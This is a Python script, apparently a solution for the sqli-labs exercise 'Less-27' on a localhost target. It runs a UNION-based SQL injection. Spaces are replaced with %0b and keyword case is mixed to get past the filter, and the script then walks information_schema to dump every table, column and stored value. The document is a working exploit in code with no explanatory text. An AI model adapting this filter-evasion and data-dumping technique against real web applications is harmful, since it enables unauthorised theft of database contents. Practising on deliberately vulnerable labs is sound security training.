import requests
import base64

get_table = "(seLect group_concat(table_name) from information_schema.tables where table_schema=database())".replace(' ', '%0b')
get_column = "(seLect group_concat(column_name) from information_schema.columns where table_name='{0}')".replace(' ', '%0b')
get_secret = "(seLect group_concat({0}) from {1})".replace(' ', '%0b')
url = "http://localhost:1234/Less-27/?id="
session = requests.Session()

payload = "' unIon seLect 1,{},'3".replace(' ', '%0b')
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[576:-298-len(payload.format(get_table))]
tables = temp.split(',')
print("Tables :", *tables)
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    response = requests.post(url+payload.format(find))
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[576:-298-len(payload.format(find))]
    columns = temp.split(',')
    print("Columns : ", *columns)
    for j in columns:
        print("From Column", j, ": ")
        find = get_secret.format(j, i)
        response = requests.post(url+payload.format(find))
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[576:-302-len(payload.format(find))])
